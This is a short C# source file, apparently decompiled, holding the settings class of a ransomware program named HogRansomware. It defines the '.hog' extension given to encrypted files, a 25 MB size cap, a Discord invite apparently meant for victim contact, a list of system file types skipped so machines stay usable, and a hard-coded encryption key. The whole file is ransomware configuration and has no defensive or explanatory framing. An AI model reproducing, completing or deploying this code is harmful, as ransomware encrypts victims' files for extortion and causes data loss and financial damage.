namespace HogRansomware;

internal static class Settings
{
	internal static string Key;

	internal static string Extension = ".hog";

	internal static long MaxSize = 26214400L;

	internal static string DiscordInvite = "https://discord.gg/9ac282CEqh";

	internal static string[] Exclusions = new string[7] { ".exe", ".dll", ".ini", ".scr", ".sys", ".vmx", ".vmdk" };

	internal static string StringEncryptionKey = "H8CWMvK3RCWgADx8ooqBvg==";
}
